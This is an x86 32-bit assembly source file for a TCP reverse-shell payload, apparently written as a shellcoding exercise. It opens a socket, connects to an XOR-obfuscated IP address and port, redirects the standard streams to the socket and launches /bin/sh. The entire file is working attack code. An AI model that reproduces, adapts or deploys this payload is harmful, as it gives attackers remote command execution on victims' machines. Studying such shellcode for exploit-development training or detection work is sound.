; Reverse shell tcp - Vikrant Navalgund 
; Targets 32-bit OS
; Sequence of steps: socket --> connect --> dup2 --> execve('/bin/sh')

%DEFINE HTON_IP_ADDR 0x4853482a
%DEFINE HTON_PORT_NO 0x6047
%DEFINE XOR_KEY       0x49534855
%DEFINE XOR_KEY_SHORT 0x494E

BITS 32

section .text
global _start
_start:
	; socket(int domain, int type, int protocol)
	; socket(AF_INET, 1, 2)
	; socketcall(int call, unsigned long *args)
	; socketcall(1, [args])
	xor eax, eax
	push eax
	push BYTE 0x1
	push BYTE 0x2
	mov ecx, esp
	xor ebx, ebx
	mov BYTE bl, 0x1
	mov BYTE al, 0x66     ; SYS_SOCKETCALL
	int 0x80
	
	mov esi, eax  ; Store the socketfd into eax on success.	

	; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; connect([esi], <sockaddr_in>, 16)
	; socketcall(3, [ars])
	; struct sockaddr_in {
	;		short              sin_family;   // Ex: AF_INET, AF_INET6 etc..
	;	    unsigned short     sin_port;     // Ex: htons(3456)
	;	    struct in_addr     sin_addr;     // 	
	;       char               sin_zero[8];  // Ex: zero this if you want to.
	; }
	xor eax, eax
	push eax
	push eax
	mov DWORD ebx, HTON_IP_ADDR
	xor ebx, XOR_KEY 
	push DWORD ebx        ; ip addr, Ex: 0x0100007f
	xor ebx, ebx
	mov WORD bx, HTON_PORT_NO
	xor bx, XOR_KEY_SHORT  
	push WORD  bx         ; port number
	push WORD  0x2
	mov  ecx, esp
   	push BYTE  0x10 	
	push ecx
	push esi
	mov ecx, esp
	mov BYTE al, 0x66     ; SYS_SOCKETCALL
	xor ebx, ebx
	mov BYTE bl, 0x3
	int 0x80	

	; dup2(int sockfd, int newfd);
	mov ebx, esi
	xor ecx, ecx
	xor eax, eax
	_dupfds:
		mov BYTE al, 0x3f ; SYS_DUP2
		int 0x80
		inc ecx
		cmp cl, 0x2
		jle _dupfds
			
	; execve(cont char* filename, char const* argv[], chat const* argp[]);
    mov BYTE al, 0xb ; SYS_EXECVE
	cdq
    push edx
	push DWORD 0x68732f2f  ; //sh			
    push DWORD 0x6e69622f  ; /bin
	mov ebx, esp
	xor ecx, ecx
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80

